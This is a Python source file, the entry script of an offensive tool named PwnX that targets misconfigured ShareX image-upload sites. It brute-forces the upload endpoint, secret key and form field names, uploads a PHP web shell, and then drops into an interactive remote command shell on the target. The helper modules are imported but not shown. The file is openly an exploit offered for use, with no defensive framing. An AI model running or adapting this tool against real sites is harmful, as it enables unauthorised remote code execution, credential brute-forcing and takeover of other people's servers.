# Title: PwnX.py, formerly known as VulnX
# Author: cs (@KaliLincox on Twitter)
# Date: 03/07/2020, remastered 26/02/2021
# Description: Pwn misconfigured sites running ShareX custom image uploader API through RFI -> RCE.

import argparse
import sys
import os

from core.validate import Validate
from core.exploit import Exploit
from core.banner import Banner
from core.logger import Logger
from core.brute import Brute
from core.cache import Cache
from core.shell import Shell


def main():
    if os.name == 'nt':
        import colorama
        colorama.init(convert=True)

    Banner.print()

    parser = argparse.ArgumentParser(usage='%(prog)s [options]')
    parser.error = Logger.error

    parser.add_argument('-v', '--verbose', help='verbose', dest='verbose', action='store_true')
    parser.add_argument('-s', '--secret', help='sharex secret key', dest='secret', metavar='')
    parser.add_argument('--form-name', help='multipart file form name', dest='form_name', metavar='', default='sharex')
    parser.add_argument('--field-name', help='sharex secret key post data field name', dest='field_name', metavar='', default='secret')
    parser.add_argument('--no-cache', help='disable cache', dest='cache_enabled', action='store_false')

    mandatory_group = parser.add_argument_group('mandatory arguments')
    mandatory_group.add_argument('-u', '--url', help='target url', dest='url', metavar='', required=True)

    brute_group = parser.add_argument_group('brute force arguments')
    brute_group.add_argument('--brute-endpoint', help='brute force file upload endpoint', dest='brute_endpoint', action='store_true')
    brute_group.add_argument('--brute-secret', help='brute force sharex secret key', dest='brute_secret', action='store_true')
    brute_group.add_argument('--brute-field', help='brute force sharex secret key post data field name', dest='brute_field', action='store_true')
    brute_group.add_argument('--brute-form', help='brute force multipart file form name', dest='brute_form', action='store_true')

    if len(sys.argv) == 1:
        parser.print_help()
        return

    args = parser.parse_args()

    if not Validate.url(args.url):
        Logger.error(f'invalid url: {args.url}')

    if not Validate.active_url(args.url):
        Logger.error('target is offline')

    Logger.success('target is online')

    try:
        url = args.url
        field_name = args.field_name
        secret = args.secret
        form_name = args.form_name

        cache_data = Cache.get(url) if args.cache_enabled else None

        if cache_data is None:
            if args.brute_endpoint:
                if args.verbose:
                    Logger.info('brute forcing endpoint...')

                url = Brute.endpoint(url)

                if url is None:
                    Logger.error('endpoint not found')

                Logger.success(f'endpoint found: \x1b[95m{url}')

            if Brute.is_required(url):  # checks if it's necessary to brute force field name and secret key
                if args.brute_field:
                    if args.verbose:
                        Logger.info('brute forcing secret key field name...')

                    field_name = Brute.field_name(url)

                    if field_name is None:
                        Logger.error('field name not found')

                    Logger.success(f'field name found: \x1b[95m{field_name}')

                if args.brute_secret:
                    if args.verbose:
                        Logger.info('brute forcing secret key...')

                    secret = Brute.secret(url, field_name)

                    if secret is None:
                        Logger.error('secret not found')

                    Logger.success(f'secret found: \x1b[95m{secret}')

            if args.brute_form:
                if args.verbose:
                    Logger.info('brute forcing multipart form name...')

                form_name = Brute.form_name(url, secret, field_name)

                if form_name is None:
                    Logger.error('form name not found')

                Logger.success(f'form name found: \x1b[95m{form_name}')

            if args.verbose:
                Logger.info('attempting to upload php web shell...')

            shell_url = Exploit.upload_shell(url, form_name, secret, field_name, args.verbose, args.cache_enabled)  # program will exit if an error occurs (shell_url cannot be None)
        else:
            Logger.info('shell url fetched from cache')
            shell_url = cache_data['shell_url']

        Shell.command_line(shell_url)

    except Exception as e:
        Logger.error(f'an error occurred while attempting to upload shell to target: \x1b[95m{e}')


if __name__ == '__main__':
    main()
